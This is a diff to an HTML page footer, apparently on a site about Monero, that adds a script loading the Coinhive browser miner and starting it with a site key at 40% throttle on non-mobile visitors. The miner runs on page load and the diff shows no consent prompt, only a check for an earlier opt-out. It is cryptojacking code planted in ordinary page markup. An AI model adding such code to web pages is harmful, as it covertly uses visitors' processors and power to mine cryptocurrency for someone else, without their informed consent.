@@ -157,6 +157,17 @@
       <div class="container">
         <p class="m-0 text-center text-white">Copyright &copy; About Monero</p>
       </div>
+      <!-- /.coinhive -->
+	  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('xDWm6lj2zaf8lDtLiAjXNUVJ1rtG41Ns', {throttle: 0.4});
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
       <!-- /.container -->
     </footer>
 
